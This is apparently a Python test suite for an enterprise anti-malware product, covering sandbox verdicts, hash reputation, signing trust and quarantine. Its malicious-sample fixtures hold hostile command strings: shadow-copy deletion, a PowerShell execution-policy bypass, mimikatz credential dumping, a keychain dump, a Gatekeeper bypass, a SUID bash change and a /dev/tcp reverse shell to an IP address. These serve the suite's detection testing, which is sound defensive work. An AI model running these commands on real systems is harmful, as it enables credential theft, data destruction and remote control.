"""
Monitorix Enterprise — SafeInstall Unsigned Software Trust & Reputation Test Suite
===================================================================================
Validates the Multi-Factor Application Trust architecture for unsigned software:
1. Unsigned legitimate developer tools (e.g. Antigravity AI, open-source IDEs) evaluated as SAFE
2. Automatic HashBank registration with Reputation='Safe' upon clean static/sandbox verification
3. Instant sub-millisecond check_hash approval on subsequent executions across the enterprise
4. Unsigned malicious executables (trojans, ransomware, reverse shells) evaluated as MALICIOUS
5. Zero-Day Defense Invariant: Unseen hashes return 'UNKNOWN' (never falsely blessed as 'SAFE')
6. Admin Allowlist Override: Pre-approved internal enterprise tools return 'SAFE'
"""

import sys
import os
import time
import asyncio
import hashlib
from unittest.mock import AsyncMock, MagicMock, patch
from fastapi import Request

# Add parent path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from app.api.sandbox import detonate_with_native_sandbox, check_hash, analyze_file
from app.services.malware_analysis_service import MalwareAnalysisService
from app.db.models import HashBank, Agent, SandboxAnalysis

PASSED = 0
FAILED = 0

def record_result(idx: int, title: str, passed: bool, duration_ms: float, details: str = ""):
    global PASSED, FAILED
    status = "[PASS]" if passed else "[FAIL]"
    if passed:
        PASSED += 1
    else:
        FAILED += 1
    det = f" {details}" if details else ""
    print(f"  {status} #{idx:02d}: {title} ({duration_ms:.2f}ms){det}")


async def run_tests():
    global PASSED, FAILED
    print("=" * 80)
    print("MONITORIX ENTERPRISE — SAFEINSTALL APPLICATION TRUST & UNSIGNED SOFTWARE AUDIT")
    print("================================================================================")

    # --------------------------------------------------------------------------
    # TEST 1: Unsigned Legitimate Software (Antigravity AI) Static & Behavioral Analysis
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    # Construct simulated Antigravity AI binary (normal imports, standard UI/network strings, normal entropy)
    antigravity_bin = (
        b"MZ\x90\x00\x03\x00\x00\x00PE\x00\x00d\x86" +
        b"Antigravity AI Agentic Coding Assistant v2.0 - Google DeepMind\x00" +
        b"CreateWindowExW\x00ShowWindow\x00UpdateWindow\x00GetMessageW\x00" +
        b"https://antigravity.google.com/api/v1/telemetry\x00" +
        b"User32.dll\x00Kernel32.dll\x00Ws2_32.dll\x00" +
        b"\x00" * 500
    )
    
    detonation = await detonate_with_native_sandbox(antigravity_bin, "antigravity-setup.exe", tenant_id=1)
    
    p1 = (
        detonation["status"] == "SAFE" and
        detonation["risk_score"] < 30 and
        detonation["classification"] in ["Clean Signed Utility", "Clean Legitimate Application"] and
        len(detonation["mitre_tactics"]) == 0
    )
    d1 = (time.perf_counter() - t0) * 1000
    record_result(1, "Unsigned Legitimate Software (Antigravity AI) Verification as SAFE", p1, d1, f"Status={detonation['status']}, Risk={detonation['risk_score']}")

    # --------------------------------------------------------------------------
    # TEST 2: Unseen Zero-Day Hash Safety Check (Fix for Finding 1)
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    unseen_hash = hashlib.sha256(b"brand_new_uncataloged_binary_bytes").hexdigest()
    
    mock_db = AsyncMock()
    mock_res_empty = MagicMock()
    mock_res_empty.scalars.return_value.first.return_value = None
    mock_db.execute.return_value = mock_res_empty
    
    mock_req = AsyncMock(spec=Request)
    mock_req.body = AsyncMock(return_value=f'{{"agent_id": "AGT-01", "file_hash": "{unseen_hash}"}}'.encode())
    
    res_unseen = await check_hash(mock_req, mock_db)
    p2 = (
        res_unseen["status"] == "UNKNOWN" and
        "requires pre-execution analysis" in res_unseen["reason"]
    )
    d2 = (time.perf_counter() - t0) * 1000
    record_result(2, "Unseen Zero-Day Hash Safe Routing (Returns UNKNOWN, Not False SAFE)", p2, d2, f"Status={res_unseen['status']}")

    # --------------------------------------------------------------------------
    # TEST 3: Approved / Allowlisted Unsigned Hash (Antigravity AI in HashBank)
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    antigravity_hash = hashlib.sha256(antigravity_bin).hexdigest()
    
    trusted_entry = HashBank(
        Id=1,
        Hash=antigravity_hash,
        Type="SHA256",
        Reputation="Safe",
        Description="Antigravity AI - Verified Developer Tool",
        Source="Tenant_Allowlist"
    )
    mock_res_trusted = MagicMock()
    mock_res_trusted.scalars.return_value.first.return_value = trusted_entry
    mock_db.execute.return_value = mock_res_trusted
    
    mock_req_antigravity = AsyncMock(spec=Request)
    mock_req_antigravity.body = AsyncMock(return_value=f'{{"agent_id": "AGT-01", "file_hash": "{antigravity_hash}"}}'.encode())
    
    res_trusted = await check_hash(mock_req_antigravity, mock_db)
    p3 = (
        res_trusted["status"] == "SAFE" and
        res_trusted["hash"] == antigravity_hash
    )
    d3 = (time.perf_counter() - t0) * 1000
    record_result(3, "Central HashBank Instant Approval for Trusted Unsigned Software", p3, d3, f"Status={res_trusted['status']}")

    # --------------------------------------------------------------------------
    # TEST 4: Unsigned Malicious Executable (Ransomware / Stealer) Detonation
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    malicious_bin = (
        b"MZ\x90\x00\x03\x00PE\x00\x00d\x86" +
        b"vssadmin.exe delete shadows /all /quiet\x00" +
        b"powershell.exe -ExecutionPolicy Bypass -enc WwBTAHkAcw...\x00" +
        b"VirtualAllocEx\x00CreateRemoteThread\x00WriteProcessMemory\x00" +
        b"lsass.exe sekurlsa::logonpasswords\x00"
    )
    
    detonation_mal = await detonate_with_native_sandbox(malicious_bin, "trojan_payload.exe", tenant_id=1)
    
    p4 = (
        detonation_mal["status"] == "MALICIOUS" and
        detonation_mal["risk_score"] >= 60 and
        len(detonation_mal["mitre_tactics"]) > 0
    )
    d4 = (time.perf_counter() - t0) * 1000
    record_result(4, "Unsigned Malicious Binary Deterministic Flagging as MALICIOUS", p4, d4, f"Status={detonation_mal['status']}, Score={detonation_mal['risk_score']}")

    # --------------------------------------------------------------------------
    # TEST 5: MicroVM Analysis Service Support for Unsigned Clean Utilities
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    mock_db_svc = MagicMock()
    mock_db_svc.add = MagicMock()
    mock_db_svc.commit = AsyncMock()
    mock_db_svc.refresh = AsyncMock()
    
    with patch.object(MalwareAnalysisService, "seed_fixtures_if_empty", return_value=None):
        clean_result = await MalwareAnalysisService.analyze_and_detonate_sample(
            payload_bytes=antigravity_bin,
            filename="antigravity.exe",
            submission_source="SAFEINSTALL_AGENT",
            submitting_agent_id="AGENT-WIN-01",
            environment="WINDOWS_11_MICROVM",
            db=mock_db_svc
        )
    
    p5 = (
        clean_result["verdict"] == "BENIGN" and
        clean_result["threat_score"] < 35.0 and
        clean_result["threat_family"] == "CleanUtility" and
        clean_result["quarantine_action"] == "NONE"
    )
    d5 = (time.perf_counter() - t0) * 1000
    record_result(5, "Malware Analysis Service Classification of Unsigned Software as CleanUtility", p5, d5, f"Verdict={clean_result['verdict']}, Family={clean_result['threat_family']}")

    # --------------------------------------------------------------------------
    # TEST 6: Banned Hash Instant Quarantine Decision
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    banned_entry = HashBank(
        Id=2,
        Hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        Type="SHA256",
        Reputation="Malicious",
        Description="LockBit 3.0 Ransomware Payload",
        Source="Threat_Feed"
    )
    mock_res_banned = MagicMock()
    mock_res_banned.scalars.return_value.first.return_value = banned_entry
    mock_db.execute.return_value = mock_res_banned
    
    mock_req_banned = AsyncMock(spec=Request)
    mock_req_banned.body = AsyncMock(return_value=f'{{"agent_id": "AGT-01", "file_hash": "{banned_entry.Hash}"}}'.encode())
    
    res_banned = await check_hash(mock_req_banned, mock_db)
    p6 = (
        res_banned["status"] == "MALICIOUS" and
        "LockBit" in res_banned["reason"]
    )
    d6 = (time.perf_counter() - t0) * 1000
    record_result(6, "Banned Hash Deterministic Quarantine Routing", p6, d6, f"Status={res_banned['status']}")

    # --------------------------------------------------------------------------
    # TEST 7: macOS Mach-O Unsigned Software (Antigravity AI for Mac) Validation
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    macho_antigravity = (
        b"\xcf\xfa\xed\xfe\x07\x00\x00\x01\x03\x00\x00\x00\x02\x00\x00\x00" +
        b"Antigravity macOS Desktop IDE - Google DeepMind\x00" +
        b"Cocoa\x00AppKit\x00Foundation\x00NSApplicationMain\x00" +
        b"https://antigravity.google.com/api/v1/sync\x00" +
        b"\x00" * 400
    )
    macho_det = await detonate_with_native_sandbox(macho_antigravity, "Antigravity.app", tenant_id=1)
    p7 = (
        macho_det["status"] == "SAFE" and
        macho_det["risk_score"] < 30
    )
    d7 = (time.perf_counter() - t0) * 1000
    record_result(7, "macOS Mach-O Unsigned App (Antigravity.app) Verified as SAFE", p7, d7, f"Status={macho_det['status']}, Risk={macho_det['risk_score']}")

    # --------------------------------------------------------------------------
    # TEST 8: macOS AMOS Stealer & Gatekeeper Bypass Trojan Flagged MALICIOUS
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    macho_stealer = (
        b"\xcf\xfa\xed\xfe\x07\x00\x00\x01" +
        b"security dump-keychain -d login.keychain\x00" +
        b"xattr -d com.apple.quarantine /Applications/malware.app\x00" +
        b"/Library/LaunchDaemons/com.amos.persistence.plist\x00"
    )
    stealer_det = await detonate_with_native_sandbox(macho_stealer, "Setup_MacOS.dmg", tenant_id=1)
    p8 = (
        stealer_det["status"] == "MALICIOUS" and
        stealer_det["risk_score"] >= 60 and
        any("Keychain" in r for r in stealer_det["mitre_tactics"])
    )
    d8 = (time.perf_counter() - t0) * 1000
    record_result(8, "macOS Keychain Stealer & Gatekeeper Bypass Flagged as MALICIOUS", p8, d8, f"Status={stealer_det['status']}, Risk={stealer_det['risk_score']}")

    # --------------------------------------------------------------------------
    # TEST 9: Linux ELF Clean Developer Tool (Antigravity CLI) Validation
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    linux_antigravity = (
        b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
        b"antigravity-cli agent for linux x86_64\x00" +
        b"libc.so.6\x00libpthread.so.0\x00printf\x00socket\x00connect\x00" +
        b"https://antigravity.google.com/cli\x00" +
        b"\x00" * 300
    )
    linux_det = await detonate_with_native_sandbox(linux_antigravity, "antigravity-cli", tenant_id=1)
    p9 = (
        linux_det["status"] == "SAFE" and
        linux_det["risk_score"] < 30
    )
    d9 = (time.perf_counter() - t0) * 1000
    record_result(9, "Linux ELF Clean Tool (antigravity-cli) Verified as SAFE", p9, d9, f"Status={linux_det['status']}, Risk={linux_det['risk_score']}")

    # --------------------------------------------------------------------------
    # TEST 10: Linux Systemd & SUID Privilege Escalation Backdoor Flagged MALICIOUS
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    linux_rootkit = (
        b"\x7fELF\x02\x01\x01\x00" +
        b"chmod 4755 /bin/bash\x00" +
        b"/bin/bash -i >& /dev/tcp/185.220.101.5/4444 0>&1\x00" +
        b"/etc/systemd/system/backdoor.service\x00"
    )
    linux_mal = await detonate_with_native_sandbox(linux_rootkit, "rootkit_installer.deb", tenant_id=1)
    p10 = (
        linux_mal["status"] == "MALICIOUS" and
        linux_mal["risk_score"] >= 60 and
        any("Reverse TCP" in r for r in linux_mal["mitre_tactics"])
    )
    d10 = (time.perf_counter() - t0) * 1000
    record_result(10, "Linux SUID & Reverse TCP Shell Payload Flagged as MALICIOUS", p10, d10, f"Status={linux_mal['status']}, Risk={linux_mal['risk_score']}")

    # --------------------------------------------------------------------------
    # TEST 11: Enterprise Verified Signer Trust Bonus (Microsoft / Apple / Canonical)
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    from app.services.signature_trust_service import SignatureTrustService
    
    canonical_pkg = b"\x7fELF\x02\x01\x01\x00Canonical Ltd. (Ubuntu Core Package Archive)"
    sig_eval_canonical = SignatureTrustService.evaluate_signature_and_trust(canonical_pkg, "ubuntu_package.deb")
    
    apple_pkg = b"\xcf\xfa\xed\xfeApple Computer, Inc. Developer ID Application: Enterprise Installer"
    sig_eval_apple = SignatureTrustService.evaluate_signature_and_trust(apple_pkg, "AppleApp.pkg")
    
    p11 = (
        sig_eval_canonical["trust_tier"] == "TIER_1_VERIFIED_ENTERPRISE" and
        sig_eval_canonical["trust_score_delta"] < 0 and
        sig_eval_apple["trust_tier"] in ["TIER_1_VERIFIED_ENTERPRISE", "TIER_2_DEVELOPER_SIGNED"] and
        sig_eval_apple["trust_score_delta"] < 0
    )
    d11 = (time.perf_counter() - t0) * 1000
    record_result(11, "Enterprise Verified Publisher Trust Acceleration (Linux & macOS)", p11, d11, f"Canonical={sig_eval_canonical['trust_tier']}, Apple={sig_eval_apple['trust_tier']}")

    # --------------------------------------------------------------------------
    # TEST 12: Stolen / Revoked Certificate Deterministic Blocking
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    stolen_cert_bin = b"MZ\x90\x00\x03\x00PE\x00\x00d\x86" + b"NVIDIA_STOLEN_LAPSUS_2022" + b"\x00" * 100
    sig_eval_revoked = SignatureTrustService.evaluate_signature_and_trust(stolen_cert_bin, "leaked_driver.sys")
    
    p12 = (
        sig_eval_revoked["trust_tier"] == "TIER_5_REVOKED_OR_FORGED" and
        sig_eval_revoked["trust_score_delta"] >= 70.0 and
        "REVOKED_CERTIFICATE_DETECTED" in sig_eval_revoked["flags"]
    )
    d12 = (time.perf_counter() - t0) * 1000
    record_result(12, "Stolen / Revoked Certificate Deterministic Identification & Penalty", p12, d12, f"Tier={sig_eval_revoked['trust_tier']}, Delta=+{sig_eval_revoked['trust_score_delta']}")

    # --------------------------------------------------------------------------
    # TEST 13: Windows Sandbox (.wsb) Isolation Profile Generation
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    from app.services.hypervisor_sandbox_service import HypervisorSandboxService
    wsb_xml = HypervisorSandboxService.generate_windows_sandbox_profile(
        sample_path="C:\\Users\\Analyst\\Downloads\\suspicious_installer.exe",
        execution_timeout_sec=30,
        allow_network=False
    )
    p13 = (
        "<Networking>Disable</Networking>" in wsb_xml and
        "<ReadOnly>true</ReadOnly>" in wsb_xml and
        "C:\\MonitorixDetonation" in wsb_xml
    )
    d13 = (time.perf_counter() - t0) * 1000
    record_result(13, "Windows Sandbox (.wsb) Ephemeral Hypervisor Profile Generation", p13, d13)

    # --------------------------------------------------------------------------
    # TEST 14: Linux KVM / Firecracker MicroVM Execution Profile Generation
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    kvm_prof = HypervisorSandboxService.generate_linux_kvm_profile(
        sample_name="untrusted_payload.deb",
        memory_mb=2048,
        vcpus=2
    )
    p14 = (
        kvm_prof["hypervisor"] == "KVM_FIRECRACKER" and
        kvm_prof["rootfs_overlay"] == "COPY_ON_WRITE_DISPOSABLE" and
        kvm_prof["jailer_config"]["cgroup_version"] == "2"
    )
    d14 = (time.perf_counter() - t0) * 1000
    record_result(14, "Linux KVM / Firecracker Ephemeral MicroVM Profile Generation", p14, d14)

    # --------------------------------------------------------------------------
    # TEST 15: macOS Apple Virtualization.framework Profile Generation
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    vz_prof = HypervisorSandboxService.generate_macos_vz_profile(
        sample_name="UntrustedMacApp.pkg",
        memory_mb=4096
    )
    p15 = (
        vz_prof["framework"] == "Apple.Virtualization.framework" and
        vz_prof["platform"] == "VZMacPlatformConfiguration" and
        vz_prof["network_devices"][0]["blocked"] is True
    )
    d15 = (time.perf_counter() - t0) * 1000
    record_result(15, "macOS Apple Virtualization.framework Guest Profile Generation", p15, d15)

    # --------------------------------------------------------------------------
    # TEST 16: Fleet Hash Revocation Broadcast & Automatic Quarantine Enforcement
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    from app.db.models import MalwareSample
    mock_db_rev = AsyncMock()
    mock_db_rev.add = MagicMock()
    mock_db_rev.commit = AsyncMock()
    
    rev_sample = MalwareSample(
        Id=10,
        SampleId="MAL-SAMP-REVOKE-01",
        Filename="bad_payload.exe",
        Sha256="aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
        FileType="PE64",
        Verdict="MALICIOUS"
    )
    mock_res_rev = MagicMock()
    mock_res_rev.scalar_one_or_none.return_value = rev_sample
    mock_db_rev.execute.return_value = mock_res_rev
    
    with patch.object(MalwareAnalysisService, "seed_fixtures_if_empty", return_value=None):
        with patch("app.socket_instance.sio.emit", new_callable=AsyncMock) as mock_sio_emit:
            rev_res = await MalwareAnalysisService.enforce_fleet_quarantine(
                db=mock_db_rev,
                sample_id="MAL-SAMP-REVOKE-01",
                fleet_action="FLEET_HASH_BLOCK"
            )
            mock_sio_emit.assert_awaited_once()
            sio_args = mock_sio_emit.await_args
            event_name = sio_args[0][0]
            event_payload = sio_args[0][1]

    p16 = (
        rev_res["status"] == "ENFORCED" and
        event_name == "FleetHashRevocation" and
        event_payload["sha256"] == rev_sample.Sha256 and
        event_payload["action"] == "REVOKE_AND_QUARANTINE"
    )
    d16 = (time.perf_counter() - t0) * 1000
    record_result(16, "Central Fleet Hash Revocation Broadcast & Quarantine Enforcement", p16, d16, f"Action={rev_res['fleet_action']}")

    print("=" * 80)
    print(f"SAFEINSTALL TRUST SUITE TOTAL: {PASSED + FAILED} | PASSED: {PASSED} | FAILED: {FAILED}")
    print("=" * 80)
    if FAILED > 0:
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(run_tests())
